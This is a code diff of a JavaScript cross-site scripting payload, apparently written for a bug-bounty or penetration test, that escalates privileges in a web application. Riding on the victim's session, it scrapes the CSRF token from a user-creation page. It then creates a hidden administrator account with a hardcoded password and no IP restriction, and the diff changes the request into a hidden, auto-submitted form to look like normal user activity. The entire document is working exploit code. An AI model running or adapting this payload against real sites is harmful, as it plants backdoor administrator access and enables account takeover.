@@ -1,7 +1,4 @@
 (function () {
-  const password = "S9v!tN#2gFqX@4zW";
-  const email = "eroel+spprivescfromencoder@secuna.io";
-
   fetch("/client/settings/users/create", {
     credentials: "include"
   })
@@ -11,40 +8,43 @@
       const doc = parser.parseFromString(html, "text/html");
       const tokenInput = doc.querySelector('input[name="_token"]');
       if (!tokenInput) return console.error("Token not found");
+
       const token = tokenInput.value;
 
-      const body = new URLSearchParams({
-        _token: token,
-        name: "Secuna Privesc From Encoder1",
-        email: email,
-        nickname: "Privesc From Encoder1",
-        birthdate: "1990-01-01",
-        nationality: "Filipino",
-        passport_no: "123456789",
-        role_id: "1",
-        signatory: "0",
-        on_e_sign: "0",
-        password: password,
-        password_confirmation: password,
-        user_status: "1",
-        allow_all_ip: "1"
-      });
+      // Build and submit a hidden form (mimics real user behavior)
+      const form = document.createElement("form");
+      form.method = "POST";
+      form.action = "/client/settings/users";
+      form.style.display = "none";
 
-      return fetch("/client/settings/users", {
-        method: "POST",
-        credentials: "include",
-        headers: {
-          "Content-Type": "application/x-www-form-urlencoded"
-        },
-        body: body.toString()
-      });
-    })
-    .then(res => res.text())
-    .then(response => {
-      console.log("[XSS - Admin Created]");
-      console.log("Email:", email);
-      console.log("Password:", password);
-      console.log("Response:", response);
-    })
-    .catch(console.error);
+      const addField = (name, value) => {
+        const input = document.createElement("input");
+        input.type = "hidden";
+        input.name = name;
+        input.value = value;
+        form.appendChild(input);
+      };
+
+      // Add fields
+      addField("_token", token);
+      addField("name", "Secuna Privesc Encoder");
+      addField("email", "eroel+spprivescencoder@secuna.io");
+      addField("nickname", "PrivescFromEncoder");
+      addField("birthdate", "1990/01/01");
+      addField("nationality", "Afghan");
+      addField("passport_no", "987654321");
+      addField("role_id", "1");
+      addField("position_id", "");
+      addField("signatory", "0");
+      addField("on_e_sign", "0");
+      addField("password", "S9v!tN#2gFqX@4zW");
+      addField("password_confirmation", "S9v!tN#2gFqX@4zW");
+      addField("user_status", "1");
+      addField("allow_all_ip", "1");
+      addField("principal_assigned_all", "3");
+      addField("principal_ids[]", "284");
+
+      document.body.appendChild(form);
+      form.submit(); // Triggers full navigation request
+    });
 })();
